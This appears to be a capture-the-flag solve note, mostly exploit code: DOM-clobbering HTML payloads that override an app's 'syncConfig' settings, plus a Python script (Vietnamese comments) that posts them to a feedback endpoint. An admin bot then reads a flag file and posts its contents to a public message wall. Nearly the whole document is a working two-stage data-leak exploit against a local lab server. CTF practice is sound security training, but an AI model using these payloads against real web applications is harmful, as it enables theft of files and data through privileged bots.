```
<a id="syncConfig" name="statusSink" href="/api/feedback"></a>
<a id="syncConfig" name="source" href="/api/file"></a>
<a id="syncConfig" name="readSink" href="/api/feedback"></a>

```

```
<a id="syncConfig" name="statusSink" href="/api/sync"></a>
<a id="syncConfig" name="source" href="/api/file?dir=120-yen-lang&amp;file=flag_80f8826e234f33263c5192451cdfb3e4.txt"></a>
<a id="syncConfig" name="readSink" href="/api/feedback"></a>
```

```python
import os

import sys

import time

import re

import json

import urllib.request

import urllib.parse

# Thay đổi URL này thành URL của server CTF (ví dụ: http://10.10.x.x:6101)

BASE_URL = "http://127.0.0.1:6101"

def post_feedback(text):

"""Gửi lời nhắn lên /api/feedback, xử lý rate limit (HTTP 429) nếu có."""

while True:

try:

data = json.dumps({"text": text}).encode('utf-8')

req = urllib.request.Request(

f"{BASE_URL}/api/feedback",

data=data,

headers={"Content-Type": "application/json", "Accept": "application/json"},

method="POST"

)

with urllib.request.urlopen(req) as resp:

res = json.loads(resp.read().decode())

print(f"[+] Đã gửi lời nhắn thành công (ID: {res.get('id')})")

return res

except urllib.error.HTTPError as err:

if err.code == 429:

print("[!] Bị giới hạn tần suất (HTTP 429), đợi 3.5 giây rồi thử lại...")

time.sleep(3.5)

else:

raise

def get_messages():

"""Lấy danh sách tin nhắn công khai từ tường."""

req = urllib.request.Request(f"{BASE_URL}/api/messages", headers={"Accept": "application/json"})

with urllib.request.urlopen(req) as resp:

res = json.loads(resp.read().decode())

return res.get("messages", [])

def main():

print("=== Giai đoạn 1: Leak tên file flag ===")

payload_1 = '<a id="syncConfig"></a><a id="syncConfig" name="statusSink" href="/api/feedback"></a>'

post_feedback(payload_1)

print("[*] Đang chờ bot đọc thư và đăng tên file flag lên tường...")

flag_file = None

for _ in range(15):

time.sleep(2)

messages = get_messages()

for msg in messages:

body = msg.get("body", "")

match = re.search(r"flag_[a-f0-9]+\.txt", body)

if match:

flag_file = match.group(0)

print(f"[!] Tìm thấy tên file flag: {flag_file}")

break

if flag_file:

break

if not flag_file:

print("[-] Không tìm thấy tên file flag!")

sys.exit(1)

print("\n=== Giai đoạn 2: Leak nội dung flag ===")

time.sleep(3.5) # Tránh Rate limit

payload_2 = (

f'<a id="syncConfig"></a>'

f'<a id="syncConfig" name="source" href="/api/file?name={flag_file}"></a>'

f'<a id="syncConfig" name="readSink" href="/api/feedback"></a>'

)

post_feedback(payload_2)

print("[*] Đang chờ bot đọc file flag và đăng nội dung lên tường...")

flag = None

for _ in range(15):

time.sleep(2)

messages = get_messages()

for msg in messages:

body = msg.get("body", "")

match = re.search(r"PTITCTF\{[^}]+\}", body)

if match:

flag = match.group(0)

print("\n" + "="*45)

print(f"[SUCCESS] FLAG: {flag}")

print("="*45 + "\n")

break

if flag:

break

if not flag:

print("[-] Chưa lấy được flag, hãy kiểm tra lại trạng thái server.")

if __name__ == "__main__":

main()

```

```
{"text": "<a id=\"syncConfig\"></a><a id=\"syncConfig\" name=\"statusSink\" href=\"/api/feedback\"></a>"}  
```


![[Pasted image 20260822203037.png]]